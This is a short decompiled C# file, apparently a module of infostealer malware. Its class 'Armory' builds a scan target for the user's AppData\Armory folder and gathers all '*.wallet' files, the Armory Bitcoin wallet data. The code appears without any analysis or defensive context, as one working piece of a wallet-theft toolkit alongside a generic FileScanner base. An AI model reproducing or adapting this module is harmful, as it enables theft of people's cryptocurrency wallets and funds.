using System;
using System.Collections.Generic;
using System.IO;

// Token: 0x0200001A RID: 26
public class Armory : FileScanner
{
	// Token: 0x0600009E RID: 158 RVA: 0x00003761 File Offset: 0x00001961
	public Armory()
	{
		base.Name = "Armory";
	}

	// Token: 0x0600009F RID: 159 RVA: 0x00003779 File Offset: 0x00001979
	public override string GetFolder(FileScannerArg scannerArg, FileInfo filePath)
	{
		return filePath.Directory.FullName.Replace(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\", string.Empty);
	}

	// Token: 0x060000A0 RID: 160 RVA: 0x00007FBC File Offset: 0x000061BC
	public override IEnumerable<FileScannerArg> GetScanArgs()
	{
		List<FileScannerArg> list = new List<FileScannerArg>();
		try
		{
			string directory = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Armory";
			list.Add(new FileScannerArg
			{
				Directory = directory,
				Pattern = "*.wallet",
				Recoursive = false
			});
			return list;
		}
		catch
		{
			return list;
		}
	}
}
